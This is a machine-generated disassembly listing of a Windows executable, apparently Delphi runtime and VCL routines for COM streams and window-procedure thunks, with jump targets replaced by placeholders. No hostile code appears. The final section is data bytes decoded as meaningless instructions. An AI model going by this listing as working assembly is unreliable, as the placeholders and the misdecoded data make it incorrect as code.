mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421690
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4216ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40335c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42174c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421770
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4217b8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov edx esi
call sub_4219e8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_421820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4219e8
mov edx ebx
mov eax esi
call sub_4219dc
sub_421864
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420f48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4218a8
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420f94
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_421248
jmp r-xdata
mov eax esi
call sub_4189bc
mov edx eax
mov eax edi
call sub_4219e8
lea eax [ edi + 0x50 ]
call sub_40d4f0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_421908
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421264
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421934
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421950
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42196c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4219e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4187c4
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4188d4
cmp ebp eax
jne r-xdata
sub_421a28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421248
mov edx ebx
call sub_421018
sub_421a54
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_421a9c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4032a8
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_421ad4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421b23
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421b3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421b8b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421ba4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421c0e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421c28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421c71
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41b07c
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421c8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4059a8
xor eax eax
push ebp
push sub_421e79
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_421e52
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421e41
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e80
lea eax [ ebp + 0xc ]
call sub_405934
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421ebc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_421f1f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421f50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418cd4
mov edi eax
xor eax eax
push ebp
push sub_421fa5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421fac
mov eax [ rw-data ]
call sub_418d38
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188d4
call sub_4032a8
inc esi
dec ebx
jne r-xdata
sub_421fc4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_421fec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_421fc4
lea eax [ esi + 0x5 ]
call sub_421fe4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_421fe4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_4220a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d68
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421fec
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_42215c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_422084
sub_422184
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422228
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42222f
retn
mov eax [ rw-data ]
call sub_417ebc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421f50
xor edx edx
xor eax eax
call sub_41bfe0
mov eax rw-data
call sub_40d4f0
call sub_406064
lea eax [ eax + 0xc ]
call sub_40d4f0
mov eax rw-data
call sub_40d4f0
mov eax rw-data
call sub_405934
mov eax sub_421fbc
call sub_4057d0
mov eax rw-data
call sub_40d4f0
call sub_420d68
mov eax rw-data
call sub_40d4f0
mov eax rw-data
call sub_405934
sub_422234
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4222bd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4222c4
retn
call sub_420d34
mov eax sub_421fbc
call sub_4057c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d230
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_40594c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4177b8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b7c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b7c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4222c8
push esi
dec ecx
add [ edx + 0x640000ff ] cl
push esi
dec ecx
add [ ebx + 0x640000ff ] cl
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] cl
dec ecx
add [ ebp + 0x640000ff ] cl
push esi
dec ecx
add [ esi + 0x640000ff ] cl
push esi
dec ecx
add [ edi + 0x640000ff ] cl
push esi
dec ecx
add [ eax - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] dh
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] dh
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] bh
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] bh
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] ah
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] ah
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] ch
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] ch
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] dl
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] dl
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] bl
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] bl
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] al
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] al
add [ eax ] al
push esi
dec ecx
add [ eax - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ ecx - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ edx - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ ebx - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ edi + edi * 8 ] cl
add [ esi + edx * 2 + 0x49 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ esi - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ edi - 0x1 ] cl
add [ eax ] al
push esi
dec ecx
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] dh
push esi
dec ecx
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] bh
push esi
dec ecx
add [ esi ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] ah
push esi
dec ecx
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] ch
push esi
dec ecx
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
push esi
dec ecx
add [ 0x640000ff ] dl
push esi
dec ecx
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ecx ] bl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42266d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422674
retn
sub_422680
test [ esi ] ah
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
in al 0x26
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
inc edx
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xf004032 ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x27 ] ax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] al
inc edx
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
